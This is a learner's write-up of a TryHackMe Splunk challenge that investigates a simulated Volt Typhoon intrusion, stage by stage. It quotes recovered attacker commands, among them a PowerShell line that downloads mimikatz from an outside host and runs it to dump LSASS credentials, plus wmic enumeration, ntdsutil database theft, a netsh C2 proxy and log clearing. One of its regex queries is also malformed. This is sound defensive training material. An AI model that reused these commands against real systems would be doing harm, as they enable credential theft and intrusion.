# [THM Splunk Investigations]

**TryHackMe Path**: [Challenge]  
**Lab Topic**: [Volt Typhoon]  
**Date Completed**: [06/10/2026]

---

## 🧠 Summary

> In this challenge, I worked with Splunk to investigate a simulated intrusion attributed to the Volt Typhoon advanced persistent threat (APT) group. Acting as a security analyst,
I analyzed multiple log sources over a two-week period to identify suspicious activity and retrace the attacker’s steps within the environment.

Throughout the investigation, I leveraged threat intelligence and knowledge of Volt Typhoon’s tactics to detect indicators of compromise, including potential initial access 
methods, lateral movement, and persistence techniques. I applied log analysis and correlation techniques in Splunk to uncover patterns of malicious behavior and map the attacker’s 
activity across systems.

This challenge reinforced the importance of combining technical log analysis with threat research, enabling me to build a clearer picture of how advanced attackers operate within 
targeted networks.

---

## 🎯 Objectives
- [ ] Investigate a suspected intrusion by the notorious APT group Volt Typhoon.
      
---

## 🧰 Tools Used
- THM AttackBox
- Splunk
- Command Line

---

## 📊 Analysis & Screenshots

*** IR Scenario ***

> In this section, I completed a challenge by conducting an investigation where a SOC identified suspicious activity indicative of an advanced persistent threat group known as
Volt Typhoon. I was required to retrace the attacker’s steps and answer several related questions.

*** Initial Access ***

> In this section, I analyzed ADSelfService Plus logs to retrace the attacker’s steps and determine when Dean’s password was changed and when the account was taken over. After
launching Splunk and running the query:
index=main source="/home/volhunter/logfiles/adss.log" password username="dean-admin"
I identified the timestamp:
2024-03-24T11:10:22
>
> <img width="651" height="485" alt="1" src="https://github.com/user-attachments/assets/ad495d38-3b0a-4dcd-94a7-6e6ee1dc7a8a" />
> <img width="1328" height="778" alt="2" src="https://github.com/user-attachments/assets/ccfd33b3-817f-4d7f-b919-333ae95a1681" />

> I then discovered that the attacker created a new administrator account after compromising Dean’s account. The account identified was:
voltyp-admin
>
> <img width="1193" height="792" alt="3" src="https://github.com/user-attachments/assets/2c66cb14-e09f-4200-b4f5-b8a21cedd6f5" />

*** Execution ***

> In this section, I analyzed the attacker’s execution activity. I identified the command used to gather information about local drives on server01 and server02 using the query:
index=main sourcetype=wmic server01
The command used was:
wmic /node:server01, server02 logicaldisk get caption, filesystem, freespace, size, volumename
>
> <img width="1490" height="612" alt="4" src="https://github.com/user-attachments/assets/13a761aa-8c09-4367-870a-6d8093bf2222" />

> After using ntdsutil to create a copy of the Active Directory database and moving it to a web server, the attacker compressed the database. The password set on the archive was
identified as:
d5ag0nm@5t3r
This was discovered using the query:
index=main sourcetype=wmic temp.dit
>
> <img width="1486" height="623" alt="5" src="https://github.com/user-attachments/assets/e3d1420a-d2b6-4f43-9378-c1b7000128cf" />
> <img width="1491" height="586" alt="6" src="https://github.com/user-attachments/assets/3345a15f-7212-4c35-898e-e257781d35ba" />

*** Persistence ***

> Since the APT frequently uses web shells as a persistence mechanism, the attacker disguised the web shell as a legitimate file to maintain remote access and execute commands
undetected.

I discovered that the attacker created a web shell using Base64-encoded content and stored it in the directory:
C:\Windows\Temp\
>
> <img width="960" height="404" alt="7" src="https://github.com/user-attachments/assets/29413460-e0ca-49a5-8d52-c9282c06b45c" />
> <img width="1253" height="445" alt="8" src="https://github.com/user-attachments/assets/c0894bbf-a51d-4137-9d9b-e72cfab023fb" />

*** Defense Evasion ***

> Volt Typhoon utilized advanced defense evasion techniques to reduce the risk of detection. I identified the PowerShell cmdlet used to remove “Most Recently Used” (MRU) records
as:
Remove-ItemProperty
>
> <img width="1494" height="645" alt="9" src="https://github.com/user-attachments/assets/e54d8a00-c8f1-4024-9de7-20d5b03d6c53" />

> I also discovered that the attacker renamed and changed the extension of a file to conceal their activity. The file name identified was:
cl64.gif
>
> <img width="1160" height="700" alt="10" src="https://github.com/user-attachments/assets/5520f7b9-5b8e-493d-b183-5ff25674a5fd" />

> The registry path checked by the attacker for evidence of a virtualized environment was:
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control
This was identified using the query:
index=* "Get-ItemProperty"
>
> <img width="779" height="414" alt="11" src="https://github.com/user-attachments/assets/fa22f6cb-efcd-4d5b-8a2f-7c9e6dd999fa" />
> <img width="1232" height="229" alt="12" src="https://github.com/user-attachments/assets/0d3e8181-e935-471b-abcc-8856780611be" />

*** Credential Access ***

> The attacker used registry queries to search for stored credentials. The three applications investigated were:

OpenSSH
PuTTY
RealVNC
>
> <img width="932" height="373" alt="13" src="https://github.com/user-attachments/assets/fc74da8e-1ff1-4d0a-b2a5-dd806ea9bcd2" />
> <img width="825" height="266" alt="14" src="https://github.com/user-attachments/assets/6b0b5888-3cd3-44e9-bd3e-4364fdc3adac" />
> <img width="917" height="269" alt="15" src="https://github.com/user-attachments/assets/3316a7b7-a4da-4e91-abfc-db18dbc59161" />
> <img width="712" height="347" alt="16" src="https://github.com/user-attachments/assets/0939c919-3e38-414f-9ddc-360cea588119" />

> I then identified the full decoded command used to download and execute Mimikatz:
Invoke-WebRequest -Uri "http://voltyp.com/3/tlz/mimikatz.exe" -OutFile "C:\Temp\db2\mimikatz.exe"; Start-Process -FilePath "C:\Temp\db2\mimikatz.exe" -ArgumentList @("sekurlsa::minidump lsass.dmp", "exit") -NoNewWindow -Wait
This was discovered using the query:
index=*
| regex _raw="{A-Za-z0-9+/]{20,}={0,2}"
which then generated the base64 string for the decoded command.
>
> <img width="702" height="449" alt="17" src="https://github.com/user-attachments/assets/335e72f8-b36e-4dbb-a3b0-ea57787217ee" />
> <img width="1356" height="425" alt="18" src="https://github.com/user-attachments/assets/fd40c005-add8-4530-9832-ac0e6165d2ab" />
> <img width="2048" height="798" alt="19" src="https://github.com/user-attachments/assets/7726ae81-70b1-42fc-a5da-813eace1ac55" />

*** Discovery & Lateral Movement ***

> The attacker used wevtutil to enumerate Windows logs and searched for the following Event IDs:

4624
4625
4769
>
> <img width="561" height="435" alt="20" src="https://github.com/user-attachments/assets/a9bfbfe9-a199-48f6-a242-41b64ac19ada" />
> <img width="605" height="996" alt="21" src="https://github.com/user-attachments/assets/514bdd86-693e-412c-8ac6-0a67777c8ed0" />

> After moving laterally to server02, the attacker copied the original web shell. The new web shell created was identified as:
AuditReport.jspx
This was determined using the query:
index=* copy
>
> <img width="1496" height="652" alt="22" src="https://github.com/user-attachments/assets/56c15163-c7bb-48ff-ab79-f46c98771240" />

*** Collection ***

> During this phase, the attacker collected sensitive data. The three files copied using PowerShell were:

2022.csv
2023.csv
2024.csv
>
> <img width="1198" height="1033" alt="23" src="https://github.com/user-attachments/assets/1ca8e2b6-16b3-4990-9462-a6e315356e82" />

*** C2 & Cleanup ***

> The attacker used netsh to create a proxy for command-and-control (C2) communication. The connection address and port used were:
10.2.30.1:8443
This was identified using the query:
index=* netsh
>
> <img width="1490" height="700" alt="24" src="https://github.com/user-attachments/assets/2b2d603b-09d9-4d3a-8f4e-37d18773c8b7" />

> To conceal their activity, the attacker cleared the following event logs:

Application
Security
Setup
System
> 
> <img width="1169" height="757" alt="25" src="https://github.com/user-attachments/assets/6d528448-f9e3-45f1-b535-d49c77a1a954" />

--- 

## Reflection

> This lab strengthened my ability to work with Splunk to investigate advanced threat activity by analyzing and correlating logs across multiple sources. I developed a deeper
understanding of how to approach a real-world SOC investigation by retracing an attacker’s steps and identifying patterns of suspicious behavior over an extended time frame.

I enhanced my ability to apply threat intelligence by studying the tactics and techniques associated with Volt Typhoon, which helped me better recognize indicators of compromise 
such as unusual access patterns, lateral movement, and persistence mechanisms. This improved my ability to think critically and connect individual events into a larger attack 
narrative.

Additionally, I strengthened my skills in log correlation and timeline analysis, allowing me to piece together the sequence of attacker actions more effectively. This reinforced 
the importance of not relying on a single data point, but instead building a comprehensive view of the incident using multiple log sources.

Overall, this lab improved my confidence in handling complex investigations and better prepared me for real-world SOC environments where understanding attacker behavior and 
leveraging tools like Splunk are essential for detecting and responding to advanced threats.
